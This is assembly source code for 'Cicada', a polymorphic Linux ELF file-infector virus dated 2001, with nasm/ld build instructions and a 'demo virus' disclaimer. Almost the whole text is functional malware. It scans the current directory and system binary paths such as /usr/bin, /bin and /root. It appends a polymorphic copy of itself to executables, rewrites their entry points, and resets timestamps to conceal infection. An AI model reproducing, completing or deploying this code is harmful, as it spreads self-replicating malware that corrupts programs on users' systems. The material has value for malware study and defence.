
;=======================================================================
;
;      *** WARNNING ***
;
; This is the source code of a *DEMO VIRUS*. I won't responsibile of 
; any damage that may occur due to the assembly of this file. Use it at
; your own risk.
;
;=======================================================================
;
; Characteristics:
; 
;	 Name :	Cicada
;      Author :	Amadeus
;     Country : Taiwan
;	 Date : 2001
;	   OS :	Linux
;	 Type : ELF infector
;        Size : 1835 bytes
; Polymorphic :	Yes
;  Anti-Trace :	Yes
;
; This virus is a non-resident virus. It only infects ELF (Executable & 
; Linkable Format) under Linux. When running an infected file, it will 
; start by trying to infect other ELF files in the current directory.
; 
;-----------------------------------------------------------------------
;
; How to make the virus :
;
;	nasm -f	elf vir.s
;	ld vir.o -e main -o vir
;
;===[ vir.s ]===========================================================

section	.data
global	main

%include "syscall.h"

;===[ Host Code	]===========================================

host:
	mov eax,sys_write
	mov ebx,1
	mov ecx,_msg_hello
	mov edx,17
	int 80h
	mov eax,sys_exit
	xor ebx,ebx
	int 80h
	
_msg_hello	db 'Hello! Linux...',0dh,0ah

;===[ Virus Code ]==========================================

main:

vir_start:
	call get_reloc
get_reloc:
	pop ebp
	sub ebp,get_reloc

	mov eax,sys_brk
	lea ebx,[ebp+bss_buffer]
	int 80h
	mov byte [ebp+infect_cnt],00h

	mov eax,sys_getpid
	int 80h
	mov [ebp+pid],eax
	
	mov eax,sys_fork
	int 80h
	or eax,eax
	jz run_vir

	push dword [ebp+host_entry]
	xor edx,edx
	ret
	
run_vir:	
	mov eax,sys_getcwd
	lea ebx,[ebp+file_buffer]
	mov ecx,40h
	int 80h

	lea edi,[ebp+dir+1]
open_dir:	
	mov eax,sys_open
	lea ebx,[ebp+dir+1]
	xor ecx,ecx
	cdq
	int 80h
	mov ebx,eax
	cdq
	inc edx
	jz vir_ext
	
next_file:
	mov eax,sys_readdir
	lea ecx,[ebp+file_buffer+40h]
	cdq
	mov dl,40h
	int 80h
	or eax,eax
	jz next_dir
	
	push ebx
	push edi
	mov ebx,ecx
	add ebx,byte 10
	call infect_file
	pop edi
	pop ebx
	
	cmp byte [ebp+infect_cnt],3	; >= 3
	jb next_file
	
	mov eax,sys_getppid
	int 80h
	cmp eax,[ebp+pid]
	jnz vir_ext
	jmp next_file

next_dir:
	mov eax,sys_close
	int 80h

	movzx eax,byte [edi-01h]
	add edi,eax
	mov al,sys_chdir
	mov ebx,edi
	int 80h
	or eax,eax
	jz open_dir
	
vir_ext:
	mov eax,sys_chdir
	lea ebx,[ebp+file_buffer]
	int 80h

	mov eax,sys_kill
	mov ebx,0
	mov ecx,2
	int 80h
;	mov eax,sys_exit	; THE END  :-)
;	int 80h			;
	

infect_file:
	mov eax,sys_open
	mov ecx,2
	cdq
	int 80h
	cdq 
	xchg eax,ebx
	inc edx
	jnz open_ok
	ret
dont_infect:
	mov eax,sys_close
	int 80h	
	ret
	
open_ok:
	mov eax,sys_read
	lea ecx,[ebp+elf_buffer]
	cdq
	mov dl,34h+20h*6
	int 80h
	cmp dword [ebp+e_ident],464c457fh
	jnz dont_infect
	cmp dword [ebp+e_type],00030002h
	jnz dont_infect
	cmp byte [ebp+elf_buffer+0fh],00h
	ja dont_infect

	mov eax,sys_fstat
	lea ecx,[ebp+file_buffer+80h]
	int 80h
	
	rdtsc
	or al,01h
	mov byte [ebp+elf_buffer+0fh],al
	
	lea esi,[ebp+ph_buffer]
	movzx eax,word [ebp+e_phnum]
	dec eax
	mov ecx,eax
	imul eax,eax,byte 20h
	add esi,eax
next_phe:
	cmp byte [esi],1
	jz infect_it
	sub esi,byte 20h
	loop next_phe
	jmp dont_infect
	
infect_it:	
	cmp byte [esi+20h],2
	jz has_dynamic
	mov eax,[esi+04h]
	add eax,[esi+10h]
	jmp modify_head
	
has_dynamic:  
	movzx eax,word [ebp+e_shnum]
	imul eax,eax,byte 28h
next_bss:	
	or eax,eax
	jz no_bss
	push eax
	neg eax
	xchg eax,ecx
	mov eax,sys_lseek
	cdq
	mov dl,2
	int 80h
	mov eax,sys_read
	lea ecx,[ebp+sh_buffer]
	cdq
	mov dl,28h
	int 80h	
	pop eax
	sub eax,28h
	cmp byte [ebp+sh_type],08h
	jnz next_bss
	
	mov eax,sys_lseek
	mov ecx,[ebp+sh_offset]
	cdq
	int 80h
	push ebx
	mov eax,sys_brk
	lea ebx,[ebp+bss_buffer]
	mov edi,ebx
	mov ecx,[ebp+sh_size]
	add ebx,ecx
	mov edx,ecx
	int 80h
	pop ebx
	xor eax,eax
	repz stosb
	mov eax,sys_write
	lea ecx,[ebp+bss_buffer]
	int 80h
	
no_bss:	
	mov eax,sys_lseek
	xor ecx,ecx
	cdq
	mov dl,2
	int 80h

modify_head:	 
	push dword [ebp+e_entry]
	pop dword [ebp+host_entry]
	
	xchg eax,ecx
	push ecx
	mov eax,sys_lseek
	cdq
	int 80h
	
	sub eax,[esi+04h]
	add eax,[esi+08h]
	lea ecx,[ebp+vir_start]
	mov edx,vir_size
	lea edi,[ebp+poly_buffer]
	call Maze

	pop eax
	sub eax,[esi+04h]	; [esi+04h] = p_offset
	push eax
	add eax,[ebp+maze_size]
	mov [esi+10h],eax	; [esi+10h] = p_filesz
	mov [esi+14h],eax	; [esi+14h] = p_memsz
	pop eax
	add eax,[ebp+maze_entry]
	add eax,[esi+08h]	; [esi+08h] = p_vaddr
	mov [ebp+e_entry],eax		

	mov eax,sys_write
	mov ecx,[ebp+maze_offset]
	mov edx,[ebp+maze_size]
	int 80h

	xor ecx,ecx
	mov [ebp+e_shentsize],ecx
	mov [ebp+e_shnum],ecx
	or byte	[esi+18h],7

	mov eax,sys_lseek
	cdq
	int 80h
	mov eax,sys_write
	lea ecx,[ebp+elf_buffer]
	cdq
	mov dl,34h+20h*6
	int 80h
	
	mov eax,sys_close
	int 80h
	
	mov eax,sys_utime
	lea ebx,[ebp+file_buffer+40h+10]
	lea ecx,[ebp+file_buffer+80h+20h]
	mov edx,[ecx+08h]
	mov [ecx+04h],edx
	int 80h
	inc byte [ebp+infect_cnt]
	ret
	
;anti_trace:  
;	rdtsc
;	xchg eax,ecx
;	rdtsc
;	sub eax,ecx
;	cmp eax,64
;	jbe no_msg
;	mov eax,sys_write
;	mov ebx,1
;	lea ecx,[ebp+_msg_smile]
;	mov edx,23
;	int 80h
;	mov eax,sys_exit
;	int 80h
;no_msg:	
;	ret

;-----------------------------------------------------------

dir		db  3, '.',0
		db 16, '/usr/local/bin',0
		db 17, '/usr/local/sbin',0
		db 10, '/usr/bin',0
		db  6, '/bin',0
		db  7, '/sbin',0
		db  7, '/root',0
		db  0
		
_msg_virus	db '===[Cicada]===',0dh,0ah
		db 'Made in Taiwan',0dh,0ah,0
	
;_msg_smile	db '^_*	You got	a Virus!!',0dh,0ah,0

host_entry	dd host

%include "maze.s"

vir_end:
vir_size equ vir_end-vir_start

;===[ Buffer ]==============================================

infect_cnt	db 0
pid		dd 0

sh_buffer:
sh_name		dd 0
sh_type		dd 0
sh_flags	dd 0
sh_addr		dd 0
sh_offset	dd 0
sh_size		dd 0
sh_link		dd 0
sh_info		dd 0
sh_addralign	dd 0
sh_entsize	dd 0

elf_buffer:
e_ident		times 16 db 0
e_type		dw 0
e_machine	dw 0
e_version	dd 0
e_entry		dd 0
e_phoff		dd 0
e_shoff		dd 0
e_flags		dd 0
e_ehsize	dw 0
e_phentsize	dw 0
e_phnum		dw 0
e_shentsize	dw 0
e_shnum		dw 0
e_shstrndx	dw 0
ph_buffer	times 32*6 db 0

file_buffer	times 40h*3 db 0ffh

poly_buffer	times 1024*16 db 90h
addr_buffer	times 1024*4 db 00h

bss_buffer:

;===[ End of vir.s ]====================================================
